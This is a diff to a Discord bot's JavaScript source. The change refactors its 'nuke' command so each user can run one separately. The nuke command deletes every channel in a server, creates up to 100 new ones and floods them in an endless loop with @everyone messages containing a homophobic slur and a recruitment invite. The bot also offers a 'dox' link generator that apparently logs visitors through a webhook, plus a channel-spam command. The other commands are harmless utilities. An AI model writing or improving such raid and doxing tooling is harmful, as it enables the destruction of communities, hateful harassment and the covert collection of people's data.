@@ -17,9 +17,9 @@ const client = new Client({
 
 const links = new Map();
 const startTime = Date.now();
-let nukeRunning = false;
-let nukeGuildId = null;
-let nukeChannels = [];
+
+// ---- PER-USER NUKE TRACKING ----
+const userNukes = new Map(); // key: userId, value: { guildId, channels, running }
 
 app.get('/img/:id.png', (req, res) => {
     const id = req.params.id;
@@ -34,8 +34,8 @@ async function registerCommands() {
     const commands = [
         { name: 'dox', description: 'Generate dox link', options: [{ name: 'webhook', type: 3, description: 'Webhook URL', required: true }] },
         { name: 'spam', description: 'Spam a channel', options: [{ name: 'count', type: 4, description: 'Messages (max 100)', required: true }, { name: 'message', type: 3, description: 'Content', required: true }, { name: 'delay', type: 4, description: 'Delay in ms', required: false }] },
-        { name: 'nuke', description: 'Continuously spam up to 100 channels until /stop', options: [{ name: 'channels', type: 4, description: 'Channels to create (default 20, max 100)', required: false }, { name: 'delay', type: 4, description: 'Delay in ms between messages (default 50)', required: false }] },
-        { name: 'stop', description: 'Stop all ongoing nuke/spam activity' },
+        { name: 'nuke', description: 'Start your own nuke (up to 100 channels)', options: [{ name: 'channels', type: 4, description: 'Channels to create (default 20, max 100)', required: false }, { name: 'delay', type: 4, description: 'Delay in ms between messages (default 50)', required: false }] },
+        { name: 'stop', description: 'Stop YOUR nuke only' },
         { name: 'ad', description: 'Advertise the server invite' },
         { name: 'purge', description: 'Delete messages in bulk', options: [{ name: 'amount', type: 4, description: 'Number to delete (max 100)', required: true }, { name: 'user', type: 6, description: 'Target user', required: false }, { name: 'reason', type: 3, description: 'Reason', required: false }] },
         { name: 'ping', description: 'Check bot latency' },
@@ -80,17 +80,20 @@ client.on('interactionCreate', async (interaction) => {
         const { commandName, options, user, member, guild, channel } = interaction;
         console.log(`[${new Date().toISOString()}] ${user.tag} -> /${commandName}`);
 
+        // ---- STOP (only stops YOUR nuke) ----
         if (commandName === 'stop') {
-            if (!nukeRunning) {
-                return interaction.editReply('❌ No ongoing nuke/spam to stop.');
+            const userId = user.id;
+            if (!userNukes.has(userId)) {
+                return interaction.editReply('❌ You don\'t have a running nuke.');
             }
-            nukeRunning = false;
-            nukeGuildId = null;
-            nukeChannels = [];
-            await interaction.editReply('⏹️ **Stopped all ongoing nuke/spam activity.**');
+            const nuke = userNukes.get(userId);
+            nuke.running = false;
+            userNukes.delete(userId);
+            await interaction.editReply('⏹️ **Your nuke has been stopped.**');
             return;
         }
 
+        // ---- DOX ----
         if (commandName === 'dox') {
             const wh = options.getString('webhook');
             if (!wh || !wh.startsWith('https://discord.com/api/webhooks/')) {
@@ -108,13 +111,13 @@ client.on('interactionCreate', async (interaction) => {
             return;
         }
 
+        // ---- SPAM ----
         if (commandName === 'spam') {
             const count = Math.min(options.getInteger('count'), 100);
             const msg = options.getString('message');
             const delay = options.getInteger('delay') || 0;
             if (!channel) return interaction.editReply('❌ No channel.');
             for (let i = 0; i < count; i++) {
-                if (!nukeRunning) break;
                 await channel.send(msg);
                 if (delay > 0) await new Promise(r => setTimeout(r, delay));
             }
@@ -122,32 +125,43 @@ client.on('interactionCreate', async (interaction) => {
             return;
         }
 
+        // ---- NUKE (per-user) ----
         if (commandName === 'nuke') {
-            if (nukeRunning) {
-                return interaction.editReply('❌ A nuke is already running. Use `/stop` to stop it first.');
+            const userId = user.id;
+
+            // Check if user already has a nuke running
+            if (userNukes.has(userId)) {
+                return interaction.editReply('❌ You already have a nuke running. Use `/stop` to stop it first.');
             }
+
             if (!guild) return interaction.editReply('❌ Server only.');
             if (!guild.members.me.permissions.has(PermissionsBitField.Flags.Administrator)) return interaction.editReply('❌ Need Admin.');
 
-            // 👇 Max channels increased to 100
             const channelCount = Math.min(options.getInteger('channels') || 20, 100);
             const delayMs = Math.min(options.getInteger('delay') || 50, 500);
             const variants = ['# PULSE OWNS ALL YOU F@GGOTS TRASH ASS SERVER', '# PULSE  OWNS ALL YOU F@GGOTS TRASH ASS SERVER', '# PULSE OWNS ALL  YOU F@GGOTS TRASH ASS SERVER', '# PULSE OWNS ALL YOU F@GGOTS TRASH  ASS SERVER', '# PULSE OWNS ALL YOU F@GGOTS TRASH ASS  SERVER'];
             const inviteLine = `# JOIN PULSE: ${INVITE_LINK}`;
 
-            await interaction.editReply(`🚀 **Nuke started!** Creating ${channelCount} channels... Use \`/stop\` to stop it.`);
+            await interaction.editReply(`🚀 **Nuke started!** Creating ${channelCount} channels... Use \`/stop\` to stop YOUR nuke.`);
 
+            // Delete all channels
             await Promise.all(guild.channels.cache.map(c => c.delete().catch(() => {})));
 
+            // Create new channels
             const newChannels = await Promise.all(Array.from({ length: channelCount }, () => guild.channels.create({ name: 'pulse', type: ChannelType.GuildText }).catch(() => null)));
             const valid = newChannels.filter(c => c);
 
-            nukeRunning = true;
-            nukeGuildId = guild.id;
-            nukeChannels = valid;
+            // Store this user's nuke
+            const nukeData = {
+                guildId: guild.id,
+                channels: valid,
+                running: true
+            };
+            userNukes.set(userId, nukeData);
 
+            // Spam loop for this user's nuke
             let messageIndex = 0;
-            while (nukeRunning && nukeGuildId === guild.id) {
+            while (nukeData.running) {
                 const line = variants[messageIndex % variants.length];
                 let big = `@everyone ${line}\n`;
                 while (big.length + line.length + 1 < 2000 - inviteLine.length - 2) big += line + '\n';
@@ -159,12 +173,12 @@ client.on('interactionCreate', async (interaction) => {
                 await new Promise(r => setTimeout(r, delayMs));
             }
 
-            if (!nukeRunning) {
-                await interaction.followUp({ content: '⏹️ **Nuke stopped.**', ephemeral: true });
-            }
+            // Cleanup when loop exits
+            userNukes.delete(userId);
             return;
         }
 
+        // ---- AD ----
         if (commandName === 'ad') {
             if (!channel) return interaction.editReply('❌ No channel.');
             const embed = new EmbedBuilder()
@@ -177,6 +191,7 @@ client.on('interactionCreate', async (interaction) => {
             return;
         }
 
+        // ---- PURGE ----
         if (commandName === 'purge') {
             const amount = Math.min(options.getInteger('amount'), 100);
             const targetUser = options.getUser('user');
@@ -195,6 +210,7 @@ client.on('interactionCreate', async (interaction) => {
             return;
         }
 
+        // ---- PING ----
         if (commandName === 'ping') {
             const sent = await interaction.editReply({ content: '🏓 Pinging...', fetchReply: true });
             const latency = sent.createdTimestamp - interaction.createdTimestamp;
@@ -202,6 +218,7 @@ client.on('interactionCreate', async (interaction) => {
             return;
         }
 
+        // ---- SERVERINFO ----
         if (commandName === 'serverinfo') {
             if (!guild) return interaction.editReply('❌ Server only.');
             const owner = await guild.fetchOwner();
@@ -221,6 +238,7 @@ client.on('interactionCreate', async (interaction) => {
             return;
         }
 
+        // ---- USERINFO ----
         if (commandName === 'userinfo') {
             const target = options.getUser('user') || user;
             const memberTarget = guild ? await guild.members.fetch(target.id).catch(() => null) : null;
@@ -243,6 +261,7 @@ client.on('interactionCreate', async (interaction) => {
             return;
         }
 
+        // ---- AVATAR ----
         if (commandName === 'avatar') {
             const target = options.getUser('user') || user;
             const embed = new EmbedBuilder()
@@ -253,6 +272,7 @@ client.on('interactionCreate', async (interaction) => {
             return;
         }
 
+        // ---- MATH ----
         if (commandName === 'math') {
             const expr = options.getString('expression');
             try {
@@ -266,6 +286,7 @@ client.on('interactionCreate', async (interaction) => {
             return;
         }
 
+        // ---- SAY ----
         if (commandName === 'say') {
             const msg = options.getString('message');
             if (!channel) return interaction.editReply('❌ No channel.');
@@ -274,6 +295,7 @@ client.on('interactionCreate', async (interaction) => {
             return;
         }
 
+        // ---- 8BALL ----
         if (commandName === '8ball') {
             const responses = ['Yes', 'No', 'Maybe', 'Ask again later', 'Definitely', 'Absolutely not', 'It is certain', 'Very doubtful'];
             const answer = responses[Math.floor(Math.random() * responses.length)];
@@ -286,6 +308,7 @@ client.on('interactionCreate', async (interaction) => {
             return;
         }
 
+        // ---- ROLL ----
         if (commandName === 'roll') {
             const sides = options.getInteger('sides') || 6;
             const result = Math.floor(Math.random() * sides) + 1;
